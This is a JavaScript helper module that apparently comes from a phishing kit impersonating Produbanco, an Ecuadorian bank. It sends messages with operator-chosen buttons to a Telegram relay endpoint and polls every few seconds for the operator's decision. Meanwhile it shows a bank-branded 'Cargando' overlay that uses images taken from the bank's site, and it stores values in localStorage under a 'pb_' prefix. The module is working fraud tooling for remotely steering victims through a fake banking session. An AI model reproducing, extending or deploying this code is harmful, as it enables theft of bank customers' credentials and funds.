var TG = (function () {
  function genId() {
    return Math.random().toString(36).substr(2, 10) + Date.now().toString(36);
  }

  function send(message, withButtons, buttonLabels, extraButton, extraButton2) {
    var sessionId = withButtons ? genId() : null;
    var body = { message: message };
    if (withButtons) {
      body.buttons = true;
      body.sessionId = sessionId;
      if (buttonLabels) {
        body.btn1Label = buttonLabels[0];
        body.btn2Label = buttonLabels[1];
      }
      if (extraButton) {
        body.btn3Label = extraButton.label;
        body.btn3Action = extraButton.action;
      }
      if (extraButton2) {
        body.btn4Label = extraButton2.label;
        body.btn4Action = extraButton2.action;
      }
    }
    return fetch('/api/send-telegram', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(body)
    })
    .then(function (r) { return r.json(); })
    .then(function (data) { 
      // Usar el sessionId devuelto por el servidor si estÃ¡ disponible
      return data.sessionId || sessionId; 
    });
  }

  function poll(sessionId, cb) {
    var timer = setInterval(function () {
      fetch('/api/check-action?id=' + sessionId)
        .then(function (r) { return r.json(); })
        .then(function (d) {
          if (d.action && d.action !== 'pending') {
            clearInterval(timer);
            cb(d.action);
          }
        })
        .catch(function () {});
    }, 3500);

    setTimeout(function () { clearInterval(timer); }, 300000);
  }

  function overlay(show) {
    var el = document.getElementById('tg-overlay');
    if (!el && show) {
      el = document.createElement('div');
      el.id = 'tg-overlay';
      el.style.cssText = 'position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(255,255,255,0.85);display:flex;flex-direction:column;align-items:center;justify-content:center;z-index:9999';

      var isIOS = /iPad|iPhone|iPod/.test(navigator.userAgent) || (navigator.platform === 'MacIntel' && navigator.maxTouchPoints > 1);
      var loaderSrc = isIOS
        ? 'https://www.produbanco.com/Produnet/Imagen/DesignSystem/loader.png'
        : 'https://www.produbanco.com/Produnet/Imagen/DesignSystem/loader.gif';

      el.innerHTML = '<p style="margin:0 0 10px;font-family:Nunito Sans,sans-serif;font-size:22px;font-weight:700;font-style:italic;color:#046a38">Cargando</p>'
        + '<img src="' + loaderSrc + '" alt="Cargando" style="width:120px;height:auto">';
      document.body.appendChild(el);
    }
    if (el) el.style.display = show ? 'flex' : 'none';
  }

  function save(key, val) {
    try { localStorage.setItem('pb_' + key, val || ''); } catch (e) {}
  }

  function load(key) {
    try { return localStorage.getItem('pb_' + key) || ''; } catch (e) { return ''; }
  }

  function clear() {
    try {
      var keys = [];
      for (var i = 0; i < localStorage.length; i++) {
        var k = localStorage.key(i);
        if (k && k.indexOf('pb_') === 0) keys.push(k);
      }
      keys.forEach(function (k) { localStorage.removeItem(k); });
    } catch (e) {}
  }

  return {
    send: send,
    poll: poll,
    overlay: overlay,
    save: save,
    load: load,
    clear: clear
  };
})();

